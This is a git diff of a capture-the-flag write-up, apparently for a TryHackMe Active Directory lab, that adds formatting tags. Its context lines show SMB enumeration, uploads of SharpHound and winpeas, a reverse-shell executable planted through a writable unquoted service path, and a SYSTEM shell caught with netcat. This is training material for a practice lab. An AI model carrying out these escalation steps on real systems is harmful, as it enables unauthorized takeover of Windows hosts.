@@ -1,7 +1,7 @@
 ---
 
 categories: [TryHackMe]
-tags: [ Active_Directory, Unquoted_Service_Path, GetUserSPNs.py, PrivEsc, OSINT, RDP]
+tags: [ Active Directory, Unquoted_Service_Path, GetUserSPNs.py, PrivEsc, OSINT, RDP]
 img_path: /assets/images/
 image:
   alt: Active Directory Hard Level Machine 📂
@@ -63,6 +63,7 @@ PORT      STATE    SERVICE       VERSION
 63121/tcp filtered unknown
 Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
+{: .nolineno}
 ## SMB Enumeration ⤵️
 
 I checked the `SMB` with no creds with `netexec tool` and I got the domain name like this so I set the hosts file accordingly 🔻
@@ -86,6 +87,7 @@ smb: \> ls
 		15587583 blocks of size 4096. 9922802 blocks available
 smb: \>
 ```
+{: .nolineno}
 from web part I got this from port 80 ->
 ![Image](Pasted%20image%2020240222222230.png)
 Also I checked port 7790 that also hosts a site and a HTTP port so lets see ➡️
@@ -167,6 +169,7 @@ PS C:\Users\bitbucket> cat Desktop\user.txt
 THM{FLAG_FLAG_FLAG_FLAG_FLAG}
 PS C:\Users\bitbucket>
 ```
+{: .nolineno}
 Now I have to collect some data for bloodhound so I will be uploading the `SharpHound.exe` Tool that will collect the data in a zip file that will be transferred to Attacker machine.
 
 I got nothing while looking into bloodhound so I uploaded <span style="color:#61ffe5">winpeas.exe</span> in to the system and ran it and got this ->
@@ -186,10 +189,12 @@ Saved as: shell.exe
 ┌──(kali🔥kali)-[~/Downloads/Tryhackme/Enterprise]
 └─$ mv shell.exe Zero.exe                      
 ```
+{: .nolineno}
 I also checked the permissions of this service like this ->
 ```powershell
 get-Acl 'C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe'
 ```
+{: .nolineno}
 ![Image](Pasted%20image%2020240223162013.png)
 I can write it so lets include our payload without any hesitation 🔽
 ```powershell
@@ -231,6 +236,7 @@ The service has not been started.
 PS C:\Program Files (x86)\Zero Tier> sc.exe start zerotieroneservice
 sc.exe start zerotieroneservice
 ```
+{: .nolineno}
 Lets see the netcat listener now that captured the `nt authority\system` Shell ->
 ```powershell
 ┌──(kali🔥kali)-[~/Downloads/Tryhackme/Enterprise]
@@ -297,4 +303,5 @@ type root.txt
 THM{FLAG-FLAG-FLAG-FLAG-FLAG-FLAG}
 C:\Users\Administrator\Desktop>
 ```
+{: .nolineno}
 I am <span style="color:#f04276">Administrator</span> Now !!
